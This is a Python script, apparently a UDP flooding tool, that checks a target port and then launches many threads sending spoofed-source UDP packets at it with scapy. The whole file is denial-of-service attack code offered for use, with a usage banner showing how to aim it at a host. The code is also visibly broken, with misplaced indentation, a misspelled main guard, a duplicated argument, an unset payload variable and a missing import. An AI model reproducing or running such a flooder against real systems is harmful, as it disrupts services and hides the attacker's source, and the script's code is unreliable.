from scapy.all import *
from threading import Thread
from datetime import datetime
import argparse
import socket
import subprocess
import sys
import random
import string

def scan(dst_ip, dst_port):
    subprocess.call('clear', shell=True)
    t1 = datetime.now()
    remoteIP = socket.gethostbyname(dst_ip)

    print("-" * 60)
    print("Please wait, scanning remote host", remoteIP)
    print("-" * 60)
    try:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            result = sock.connect_ex((remoteIP, dst_port))
            if result == 0:
                print("Port {}: Open".format(dst_port))
                return True
            else:
                return False
            sock.close()

        except KeyboardInterrupt:
            print("You pressed Ctrl+C")
            sys.exit()

        except socket.gaierror:
            print("Hostname could not be resolved. Exiting")
            sys.exit()
        except socket.error:
            print("Couldn't connect to server")
            sys.exit()
    except:
        print("error")
    t2 = datetime.now()
    total = t2 - t1
    print("Scanning Completed in: ", total)

class udp_flood(Thread):
    def __init__(self,dst_IP,dst_port):
        self.dst_IP=dst_IP
        self.dst_port=dst_port
        self.running=True
        self.intercount=0





    def run(self):
        while self.running:
            self.udpf=IP(src=RandIP(),dst=self.dst_IP)/UDP(sport=RandShort(),
                                                           dport=self.dst_port)/(self.data)
            send(self.udpf)
            print("Packet Sent :"+str(self.intercount))
            self.intercount+=1

    def arg_userage(self):
        print("-" * 60)
        print("./UDP_flooding.py")
        print("-i|--target IP <Hostname|IP>")
        print("-p|--target PORT, Plz UDP Service Port Enter ")
        print("-t|--threads <Number of Multi Run threads> Defaults to 256")
        print("-h|--help Shows \n" )
        print("Ex, python3 UDP_flooding.py -i 127.0.0.1 -p 80 -t 10000 \n")
        print("-" * 60)
        time.sleep(5)



    def parse():
        parser = argparse.ArgumentParser()
        parser.add_argument('-t',type=str,help='--target IP <Hostname|IP>')
        parser.add_argument('-p',type=int,help='--target PORT')
        parser.add_argument('-t',type=int,help='--threads <Numner of Multi run threads> Defaults to 256',default=256)
        args=parser.parse_args()
        return args

    def main(dst_ip,port,threads):
        port_check=scan(dst_ip,port)
        if port_check==True:
            for udp in range(threads):
                udp=udp_flood(dst_ip,port)
                udp.start()


        elif port_check==False:
            print("Port to Open...")



    if __name__=="__main--":
        arg_userage()
        args=parse()
        if args.i:
            dst_ip=args.i
        if args.p:
            port=args.p
        if args.t:
            threads=args.t


        main(dst_ip,port,threads)